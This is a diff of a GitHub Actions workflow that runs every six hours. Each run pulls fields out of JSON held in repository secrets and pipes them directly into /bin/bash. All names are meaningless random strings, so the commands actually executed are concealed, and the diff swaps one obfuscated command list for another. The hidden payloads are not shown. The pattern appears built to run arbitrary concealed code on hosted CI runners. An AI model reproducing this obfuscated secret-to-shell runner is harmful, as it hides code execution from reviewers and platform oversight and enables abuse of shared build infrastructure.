@@ -3,32 +3,27 @@ name: tonggansu3167
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 1/6 * * *'
+    - cron: '49 0/6 * * *'
 
-jobs:  # 24128
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: tonggansu3167
         env:
-          u109: ${{ secrets.u109 }}
+          jy34: ${{ secrets.jy34 }}
         run: |
-          echo $u109 | jq -r .vup605 | /bin/bash
-          echo $gj981 | jq -r .xbtdk7 | /bin/bash
-          echo $tqwri05 | jq -r .v7 | /bin/bash
-          echo $v9 | jq -r .go37 | /bin/bash
-          echo $vmwu81862 | jq -r .py64 | /bin/bash
-          echo $jznzj6332 | jq -r .vwi7738 | /bin/bash
-          echo $ge94 | jq -r .e7675 | /bin/bash
-          echo $mc5 | jq -r .tzr8 | /bin/bash
-          echo $zdaa79142 | jq -r .u66 | /bin/bash
-          echo $zd2 | jq -r .xbvlj46 | /bin/bash
-          echo $eyc458 | jq -r .qiw75 | /bin/bash
-          echo $p22 | jq -r .bebi8 | /bin/bash
-          echo $owpbf6018 | jq -r .otw53509 | /bin/bash
-          echo $d89 | jq -r .qs8 | /bin/bash
-          echo $fqhzu7 | jq -r .frsd3468 | /bin/bash
-          echo $f88 | jq -r .jbbsu14991 | /bin/bash
-          echo $cr60 | jq -r .ptrzz61 | /bin/bash
+          echo $jy34 | jq -r .ncpx56 | /bin/bash
+          echo $jsi9403 | jq -r .f37310 | /bin/bash
+          echo $ex28 | jq -r .sqv6597 | /bin/bash
+          echo $qzr5 | jq -r .a56 | /bin/bash
+          echo $yzv118 | jq -r .r61724 | /bin/bash
+          echo $bcz388 | jq -r .iomda3396 | /bin/bash
+          echo $qx0 | jq -r .tqkvw4883 | /bin/bash
+          echo $xpcb44 | jq -r .xdnz384 | /bin/bash
+          echo $hnog15405 | jq -r .odoq74 | /bin/bash
+          echo $rl72142 | jq -r .oxxry2792 | /bin/bash
+          echo $mjfo9810 | jq -r .dfcx22977 | /bin/bash
 
